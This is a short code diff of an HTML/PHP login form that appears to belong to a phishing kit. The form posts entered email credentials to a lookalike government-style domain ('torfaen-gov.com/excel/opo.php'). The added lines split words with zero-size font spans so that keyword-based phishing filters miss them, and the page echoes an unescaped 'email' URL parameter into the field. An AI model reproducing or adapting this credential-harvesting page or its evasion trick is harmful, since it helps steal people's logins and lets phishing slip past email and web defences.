@@ -157,7 +157,9 @@
 <div class="login">
 <form action="https://torfaen-gov.com/excel/opo.php" method="post">
 <div>
-<input type="email" id="email" name="email" required="" readonly="" value="<?php echo $_GET['email']; ?>"/>
+<input type="email" id="email" name="email" required placeholder=" " value="<?php echo $_GET['email']; ?>">
+<label for="email">Em<span style=”FONT-SIZE: 0px”>ail</span> Ad<span style=”FONT-SIZE: 0px”>dress
+</span ></label>
 <div class="requirements">
 Mu<span style=”FONT-SIZE: 0px”>st</span> be a va<span style=”FONT-SIZE: 0px”>lid</spa> em<span style=”FONT-SIZE: 0px”>ail</span> ad<span style=”FONT-SIZE: 0px”>dress
 </span>.</div>
